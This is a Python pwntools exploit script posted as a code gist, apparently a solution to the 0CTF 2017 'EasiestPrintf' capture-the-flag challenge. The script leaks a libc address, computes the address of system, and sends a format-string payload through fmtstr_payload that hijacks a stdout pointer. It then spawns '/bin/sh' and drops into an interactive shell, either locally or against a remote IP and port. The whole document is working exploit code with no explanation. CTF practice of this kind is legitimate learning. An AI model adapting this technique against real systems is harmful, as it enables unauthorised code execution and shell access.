[python] EasiestPrintf.py - CodeGist

from pwn import *

if len(sys.argv) > 1:

    DEBUG = False

else:

    DEBUG = True

libc = ELF('libc.so.6_0ed9bad239c74870ed2db31c735132ce')

context.log_level = 'info'

env = {'LD_PRELOAD':'/home/laxa/Documents/Repos/Challenges/CTF/0ctf2k17/easiestprintf/libc.so.6_0ed9bad239c74870ed2db31c735132ce'}

if DEBUG:

    r = process('./EasiestPrintf', env=env)

else:

    r = remote('202.120.7.210', 12321)

r.recvuntil('read:\n')

r.sendline(str(0x0804A044))

d = int(r.recvline().rstrip(), 16)

libcbase = d - libc.symbols['_IO_2_1_stdout_']

system = libc.symbols['system'] + libcbase

log.info('stdout: %#x' % d)

log.info('libcbase: %#x' % libcbase)

log.info('system: %#x' % system)

GDB = False

if GDB and DEBUG:

    gdb.attach(r, )

r.recvuntil('Good Bye\n')

write = {d + 148: 0x0804A570 - 0x1c, 0x0804A570: system + 1}

p = '/bin/sh;'

p += fmtstr_payload(9, write, len(p), 'byte')

log.info('len: %d' % len(p))

r.sendline(p)

r.interactive()